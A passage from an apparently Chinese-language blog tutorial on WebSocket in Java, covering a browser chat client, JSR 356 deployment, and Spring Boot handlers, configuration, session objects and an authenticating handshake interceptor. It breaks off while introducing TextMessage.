class="keyword">const</span> username = usernameInput.<span class="property">value</span>.<span class="title function_">trim</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> room = roomInput.<span class="property">value</span>.<span class="title function_">trim</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (!username || !room) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&#x27;Username and Room Name cannot be empty.&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 注意：这里的 URL 路径需要与你的 Web 应用部署路径匹配。</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 如果你的应用部署在根路径，就是 ws://.../chat/...</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 如果部署在 /my-app，就是 ws://.../my-app/chat/...</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> wsUrl = <span class="string">`ws://<span class="subst">$&#123;<span class="variable language_">window</span>.location.host&#125;</span>/your-app-context/chat/<span class="subst">$&#123;username&#125;</span>/<span class="subst">$&#123;room&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">logMessage</span>(<span class="string">`Connecting to <span class="subst">$&#123;wsUrl&#125;</span>...`</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            websocket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(wsUrl);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            websocket.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">logMessage</span>(<span class="string">&#x27;Connection established.&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                connectBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                disconnectBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                messageInput.<span class="property">disabled</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                sendBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            websocket.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">logMessage</span>(event.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            websocket.<span class="property">onclose</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">logMessage</span>(<span class="string">`Connection closed. Code: <span class="subst">$&#123;event.code&#125;</span>, Reason: <span class="subst">$&#123;event.reason&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">                connectBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                disconnectBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                messageInput.<span class="property">disabled</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                sendBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            websocket.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">logMessage</span>(<span class="string">&#x27;An error occurred.&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;WebSocket Error:&#x27;</span>, event);</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        disconnectBtn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (websocket) &#123;</span></span><br><span class="line"><span class="language-javascript">                websocket.<span class="title function_">close</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        sendBtn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> message = messageInput.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (message &amp;&amp; websocket &amp;&amp; websocket.<span class="property">readyState</span> === <span class="title class_">WebSocket</span>.<span class="property">OPEN</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                websocket.<span class="title function_">send</span>(message);</span></span><br><span class="line"><span class="language-javascript">                messageInput.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        messageInput.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keyup&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (event.<span class="property">key</span> === <span class="string">&#x27;Enter&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                sendBtn.<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：请将 <code>wsUrl</code> 中的 <code>/your-app-context/</code> 替换为你的 Web 应用的实际上下文路径。如果应用部署在根目录，就直接删除它。</p>
<hr>
<h3 id="4-5-部署与测试"><a href="#4-5-部署与测试" class="headerlink" title="4.5 部署与测试"></a>4.5 部署与测试</h3><ol>
<li>将项目打包成 <code>.war</code> 文件。</li>
<li>将 <code>.war</code> 文件部署到任何支持 JSR 356 的 Servlet 容器中，如 Tomcat 8.5+ 或 Jetty 9+。</li>
<li>启动容器。</li>
<li>在浏览器中打开多个标签页，访问 <code>index.html</code>。</li>
<li>在不同的标签页中输入不同的用户名，可以进入相同或不同的房间。</li>
<li>测试发送消息，观察消息是否只在同一房间内广播，以及加入&#x2F;离开的系统通知是否正常工作。</li>
</ol>
<hr>
<h1 id="四、Spring-Boot-集成原生-WebSocket"><a href="#四、Spring-Boot-集成原生-WebSocket" class="headerlink" title="四、Spring Boot 集成原生 WebSocket"></a>四、Spring Boot 集成原生 WebSocket</h1><h2 id="1-核心三步走"><a href="#1-核心三步走" class="headerlink" title="1. 核心三步走"></a>1. 核心三步走</h2><h3 id="1-1-添加依赖"><a href="#1-1-添加依赖" class="headerlink" title="1.1 添加依赖"></a>1.1 添加依赖</h3><p>首先，在你的 <code>pom.xml</code> 文件中添加 Spring Boot 的 WebSocket starter 依赖。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="1-2-编写处理器"><a href="#1-2-编写处理器" class="headerlink" title="1.2 编写处理器"></a>1.2 编写处理器</h3><p>在 JSR 356 中，我们使用带注解的 POJO (<code>@ServerEndpoint</code>)。在 Spring 中，我们创建一个<strong>处理器类 (Handler)</strong>，并将其注册为 Spring Bean。这个处理器负责处理 WebSocket 连接的整个生命周期。</p>
<p>Spring 提供了两个方便的抽象基类：</p>
<ul>
<li><code>TextWebSocketHandler</code>: 用于处理文本消息。</li>
<li><code>BinaryWebSocketHandler</code>: 用于处理二进制消息。</li>
</ul>
<p>你需要创建一个类继承其中之一，并重写其关键方法，这些方法与 JSR 356 的生命周期注解一一对应：</p>
<ul>
<li><code>afterConnectionEstablished(WebSocketSession session)</code>: 对应 <code>@OnOpen</code>，在连接建立后调用。</li>
<li><code>handleTextMessage(WebSocketSession session, TextMessage message)</code>: 对应 <code>@OnMessage</code>，在收到文本消息时调用。</li>
<li><code>afterConnectionClosed(WebSocketSession session, CloseStatus status)</code>: 对应 <code>@OnClose</code>，在连接关闭后调用。</li>
<li><code>handleTransportError(WebSocketSession session, Throwable exception)</code>: 对应 <code>@OnError</code>，在发生传输错误时调用。</li>
</ul>
<p><strong>示例代码：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span> <span class="comment">// 关键：将这个 Handler 注册为 Spring Bean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyWebSocketHandler</span> <span class="keyword">extends</span> <span class="title class_">TextWebSocketHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于存储所有活动会话的线程安全集合</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CopyOnWriteArraySet&lt;WebSocketSession&gt; sessions = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArraySet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionEstablished</span><span class="params">(WebSocketSession session)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        sessions.add(session);</span><br><span class="line">        System.out.println(<span class="string">&quot;New connection established: &quot;</span> + session.getId());</span><br><span class="line">        <span class="comment">// 可以向新连接发送欢迎消息</span></span><br><span class="line">        session.sendMessage(<span class="keyword">new</span> <span class="title class_">TextMessage</span>(<span class="string">&quot;Welcome to the WebSocket server!&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleTextMessage</span><span class="params">(WebSocketSession session, TextMessage message)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> message.getPayload();</span><br><span class="line">        System.out.println(<span class="string">&quot;Received message: &quot;</span> + payload + <span class="string">&quot; from session: &quot;</span> + session.getId());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 简单的广播逻辑：将收到的消息发给所有其他会话</span></span><br><span class="line">        <span class="keyword">for</span> (WebSocketSession webSocketSession : sessions) &#123;</span><br><span class="line">            <span class="keyword">if</span> (webSocketSession.isOpen() &amp;&amp; !session.getId().equals(webSocketSession.getId())) &#123;</span><br><span class="line">                webSocketSession.sendMessage(<span class="keyword">new</span> <span class="title class_">TextMessage</span>(<span class="string">&quot;Broadcast: &quot;</span> + payload));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionClosed</span><span class="params">(WebSocketSession session, CloseStatus status)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        sessions.remove(session);</span><br><span class="line">        System.out.println(<span class="string">&quot;Connection closed: &quot;</span> + session.getId() + <span class="string">&quot; with status: &quot;</span> + status.getCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleTransportError</span><span class="params">(WebSocketSession session, Throwable exception)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Error for session &quot;</span> + session.getId() + <span class="string">&quot;: &quot;</span> + exception.getMessage());</span><br><span class="line">        <span class="comment">// 发生错误后，Spring 通常会自动关闭会话，所以 afterConnectionClosed 也会被调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="1-3-注册处理器"><a href="#1-3-注册处理器" class="headerlink" title="1.3 注册处理器"></a>1.3 注册处理器</h3><p>我们已经创建了处理器 Bean，但 Spring 并不知道应该在哪个 URL 路径上激活这个处理器。我们需要一个配置类来完成这个“映射”。</p>
<ol>
<li>创建一个 Java 配置类，并注解为 <code>@Configuration</code>。</li>
<li>使用 <code>@EnableWebSocket</code> 注解来开启 Spring 的 WebSocket 功能。</li>
<li>实现 <code>WebSocketConfigurer</code> 接口。</li>
<li>重写 <code>registerWebSocketHandlers(WebSocketHandlerRegistry registry)</code> 方法，在其中注册你的处理器。</li>
</ol>
<p><strong>示例代码：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSocket</span> <span class="comment">// 开启 WebSocket 支持</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title class_">WebSocketConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MyWebSocketHandler myWebSocketHandler;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过构造器注入我们之前创建的 Handler</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebSocketConfig</span><span class="params">(MyWebSocketHandler myWebSocketHandler)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myWebSocketHandler = myWebSocketHandler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerWebSocketHandlers</span><span class="params">(WebSocketHandlerRegistry registry)</span> &#123;</span><br><span class="line">        registry.addHandler(myWebSocketHandler, <span class="string">&quot;/my-handler&quot;</span>) <span class="comment">// 注册 Handler 到指定的路径</span></span><br><span class="line">                .setAllowedOrigins(<span class="string">&quot;*&quot;</span>); <span class="comment">// 解决跨域问题</span></span><br><span class="line">                <span class="comment">// .withSockJS(); // (可选) 如果需要支持不支持 WebSocket 的旧浏览器，可以开启 SockJS 后备选项</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>registry.addHandler(myWebSocketHandler, &quot;/my-handler&quot;)</code>: 这行代码是核心，它告诉 Spring：“当有 WebSocket 连接请求访问 <code>/my-handler</code> 这个路径时，请交由 <code>myWebSocketHandler</code> 这个 Bean 来处理。”</li>
<li><code>.setAllowedOrigins(&quot;*&quot;)</code>: 这是非常重要的配置，用于处理浏览器的跨域请求。<code>&quot;*&quot;</code> 表示允许来自任何源的连接，在生产环境中应配置为具体的域名列表。</li>
<li><code>.withSockJS()</code>: 这是一个强大的后备选项。如果客户端的浏览器不支持 WebSocket，SockJS 会自动降级，使用 HTTP 长轮询等技术来模拟 WebSocket 通信，对上层应用代码是透明的。</li>
</ul>
<p>完成这三步之后，启动你的 Spring Boot 应用。一个位于 <code>ws://localhost:8080/my-handler</code> 的 WebSocket 服务就已经在运行了。这套流程充分体现了 Spring 框架“约定优于配置”和“依赖注入”的设计哲学。</p>
<hr>
<h2 id="2-核心组件详解"><a href="#2-核心组件详解" class="headerlink" title="2. 核心组件详解"></a>2. 核心组件详解</h2><p>在 Spring WebSocket 中，我们不直接与底层的 Servlet API 或 JSR-356 API 交互，而是通过 Spring 提供的一系列高度封装和抽象的组件。理解这些核心组件是掌握 Spring WebSocket 的关键。</p>
<hr>
<h3 id="2-1-Spring-封装的会话对象"><a href="#2-1-Spring-封装的会话对象" class="headerlink" title="2.1 Spring 封装的会话对象"></a>2.1 Spring 封装的会话对象</h3><p><code>WebSocketSession</code> 是 Spring 对一个 WebSocket 连接的抽象，可以将其理解为一个特定客户端连接的会话句柄。它在原生 <code>javax.websocket.Session</code> 的基础上进行了功能增强和整合，使其与 Spring 生态无缝集成。</p>
<p><strong><code>WebSocketSession</code> 与原生 <code>Session</code> 的异同：</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">Spring <code>WebSocketSession</code></th>
<th align="left">原生 <code>javax.websocket.Session</code> (JSR-356)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>本质</strong></td>
<td align="left">Spring WebSocket 模块提供的接口，是 Spring 对 WebSocket 连接的统一抽象。</td>
<td align="left">Java EE 规范 (JSR-356) 中定义的标准接口。</td>
</tr>
<tr>
<td align="left"><strong>获取方式</strong></td>
<td align="left">作为 <code>WebSocketHandler</code> 方法的参数传入。</td>
<td align="left">通过 <code>@OnOpen</code> 等注解的方法参数传入。</td>
</tr>
<tr>
<td align="left"><strong>发送消息</strong></td>
<td align="left"><code>sendMessage(WebSocketMessage&lt;?&gt; message)</code></td>
<td align="left"><code>getBasicRemote().sendText(String text)</code> 或 <code>getAsyncRemote().sendBinary(ByteBuffer data)</code></td>
</tr>
<tr>
<td align="left"><strong>会话属性</strong></td>
<td align="left"><code>Map&lt;String, Object&gt; getAttributes()</code>，与 <code>HandshakeInterceptor</code> 强关联，是传递认证信息和业务数据的核心。</td>
<td align="left"><code>Map&lt;String, Object&gt; getUserProperties()</code>，功能类似，但与 Spring 生态集成度低。</td>
</tr>
<tr>
<td align="left"><strong>用户身份</strong></td>
<td align="left"><code>getPrincipal()</code> 方法，可以方便地与 Spring Security 集成，直接获取认证后的用户信息 (<code>Principal</code> 对象)。</td>
<td align="left">需要手动从 <code>getUserProperties()</code> 中获取或通过其他方式管理用户身份。</td>
</tr>
<tr>
<td align="left"><strong>实现无关性</strong></td>
<td align="left">屏蔽了底层 WebSocket 服务器（如 Tomcat, Jetty, Undertow）的实现差异，提供统一的编程模型。</td>
<td align="left">实现由具体的 Servlet 容器提供，理论上可移植，但 Spring 提供了更高层次的抽象。</td>
</tr>
<tr>
<td align="left"><strong>关闭连接</strong></td>
<td align="left"><code>close()</code> 或 <code>close(CloseStatus status)</code></td>
<td align="left"><code>close()</code> 或 <code>close(CloseReason reason)</code></td>
</tr>
</tbody></table>
<p><strong>核心方法与属性解读：</strong></p>
<ul>
<li><strong><code>String getId()</code></strong>: 获取 Spring 自动生成的唯一会话 ID。</li>
<li><strong><code>URI getUri()</code></strong>: 获取客户端连接的 URI。</li>
<li><strong><code>Map&lt;String, Object&gt; getAttributes()</code></strong>: <strong>【极其重要】</strong> 获取在握手阶段 <code>HandshakeInterceptor</code> 中存入的属性。这是从 HTTP 握手上下文向 WebSocket 会话传递数据的<strong>核心桥梁</strong>。例如，可以存放用户 ID、租户信息等。</li>
<li><strong><code>Principal getPrincipal()</code></strong>: 如果集成了 Spring Security，此方法可以直接返回当前会-话关联的认证主体。</li>
<li><strong><code>void sendMessage(WebSocketMessage&lt;?&gt; message)</code></strong>: 发送消息到客户端。参数是 <code>TextMessage</code> 或 <code>BinaryMessage</code> 的实例。</li>
<li><strong><code>boolean isOpen()</code></strong>: 判断连接是否依然处于打开状态。</li>
<li><strong><code>void close(CloseStatus status)</code></strong>: 以指定的状态码和原因关闭连接。</li>
</ul>
<p><strong>使用场景示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 WebSocketHandler 的实现中</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionEstablished</span><span class="params">(WebSocketSession session)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 从 session 的 attributes 中获取握手时存入的用户ID</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> (String) session.getAttributes().get(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;用户 &quot;</span> + userId + <span class="string">&quot; 连接成功，会话ID: &quot;</span> + session.getId());</span><br><span class="line">    <span class="comment">// 将 session 存入一个Map，以便后续根据用户ID查找并发送消息</span></span><br><span class="line">    sessionMap.put(userId, session);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-2-握手拦截器"><a href="#2-2-握手拦截器" class="headerlink" title="2.2 握手拦截器"></a>2.2 握手拦截器</h3><p><code>HandshakeInterceptor</code> 是一个典型的拦截器（或AOP）模式应用。它在 WebSocket 的“握手”阶段（即客户端发起 HTTP Upgrade 请求时）介入，允许你在连接正式建立之前执行自定义逻辑。</p>
<p><strong>核心用途：</strong></p>
<ol>
<li><strong>身份验证与授权</strong>：这是最常见的用途。拦截器可以检查 HTTP 请求中的 <code>Cookie</code>, <code>Authorization</code> Header (如 JWT)，或者 <code>HttpSession</code>，判断用户是否已登录、是否有权限建立 WebSocket 连接。</li>
<li><strong>传递属性</strong>：将从 HTTP 请求中获取的信息（如用户ID、设备信息等）存入 <code>WebSocketSession</code> 的 <code>attributes</code> 中，供后续的 <code>WebSocketHandler</code> 使用。</li>
<li><strong>连接拒绝</strong>：如果验证失败，可以直接中断握手过程，拒绝 WebSocket 连接。</li>
</ol>
<p><strong>核心方法详解：</strong></p>
<ul>
<li><strong><code>boolean beforeHandshake(ServerHttpRequest request, ServerHttpResponse response, WebSocketHandler wsHandler, Map&lt;String, Object&gt; attributes)</code></strong>:<ul>
<li><strong>执行时机</strong>：在握手发生之前调用。</li>
<li><strong>参数解读</strong>：<ul>
<li><code>request</code>: 强转为 <code>ServletServerHttpRequest</code> 后，可从中获取 <code>HttpServletRequest</code>，进而拿到 <code>HttpSession</code>、<code>Headers</code>、<code>Cookies</code> 等所有 HTTP 相关信息。</li>
<li><code>response</code>: 如果需要拒绝连接，可以通过它设置 HTTP 状态码，例如 <code>response.setStatusCode(HttpStatus.FORBIDDEN)</code>。</li>
<li><code>wsHandler</code>: 即将处理此 WebSocket 连接的 <code>WebSocketHandler</code> 实例。</li>
<li><code>attributes</code>: <strong>【关键】</strong> 一个空的 <code>Map</code>。你可以在此方法中向这个 <code>Map</code> 填充数据，这些数据随后会被复制到 <code>WebSocketSession</code> 的 <code>attributes</code> 中。</li>
</ul>
</li>
<li><strong>返回值</strong>：<ul>
<li><code>true</code>: 握手继续，连接将建立。</li>
<li><code>false</code>: 握手被中断，连接建立失败。此时应通过 <code>response</code> 对象返回一个合适的 HTTP 错误码。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>void afterHandshake(ServerHttpRequest request, ServerHttpResponse response, WebSocketHandler wsHandler, Exception exception)</code></strong>:<ul>
<li><strong>执行时机</strong>：在握手成功或失败之后调用。</li>
<li><strong>参数解读</strong>：<ul>
<li><code>exception</code>: 如果握手过程中发生异常，此参数将不为 <code>null</code>。</li>
</ul>
</li>
<li><strong>主要用途</strong>：记录日志、资源清理等。无论握手成功与否，此方法都会被调用。</li>
</ul>
</li>
</ul>
<p><strong>实践代码示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthHandshakeInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandshakeInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">beforeHandshake</span><span class="params">(ServerHttpRequest request, ServerHttpResponse response,</span></span><br><span class="line"><span class="params">                                   WebSocketHandler wsHandler, Map&lt;String, Object&gt; attributes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 将 request 强转为 ServletServerHttpRequest 以获取 HttpSession</span></span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> ServletServerHttpRequest) &#123;</span><br><span class="line">            <span class="type">ServletServerHttpRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (ServletServerHttpRequest) request;</span><br><span class="line">            <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> servletRequest.getServletRequest().getSession(<span class="literal">false</span>); <span class="comment">// false表示不创建新session</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (session != <span class="literal">null</span> &amp;&amp; session.getAttribute(<span class="string">&quot;LOGGED_IN_USER_ID&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 用户已登录，将用户ID存入WebSocket的attributes</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> (String) session.getAttribute(<span class="string">&quot;LOGGED_IN_USER_ID&quot;</span>);</span><br><span class="line">                attributes.put(<span class="string">&quot;userId&quot;</span>, userId);</span><br><span class="line">                System.out.println(<span class="string">&quot;握手拦截器：用户 &quot;</span> + userId + <span class="string">&quot; 验证通过。&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 允许握手</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 用户未登录或 session 不存在，拒绝握手</span></span><br><span class="line">        System.out.println(<span class="string">&quot;握手拦截器：未认证用户，拒绝连接。&quot;</span>);</span><br><span class="line">        response.setStatusCode(HttpStatus.UNAUTHORIZED); <span class="comment">// 401 Unauthorized</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 拒绝握手</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterHandshake</span><span class="params">(ServerHttpRequest request, ServerHttpResponse response,</span></span><br><span class="line"><span class="params">                               WebSocketHandler wsHandler, Exception exception)</span> &#123;</span><br><span class="line">        <span class="comment">// 此处可以记录日志，例如 &quot;Handshake completed&quot; or &quot;Handshake failed with exception: ...&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-3-消息载体对象"><a href="#2-3-消息载体对象" class="headerlink" title="2.3 消息载体对象"></a>2.3 消息载体对象</h3><p>WebSocket 协议支持两种基本的数据帧类型：文本帧（Text Frame）和二进制帧（Binary Frame）。Spring WebSocket 提供了 <code>TextMessage</code> 和 <code>BinaryMessage</code> 这两个具体的类来分别承载这两种类型的消息。它们都继承自抽象类 <code>WebSocketMessage</code>。</p>
<p><strong><code>TextMessage</code></strong>:</p>
<ul>
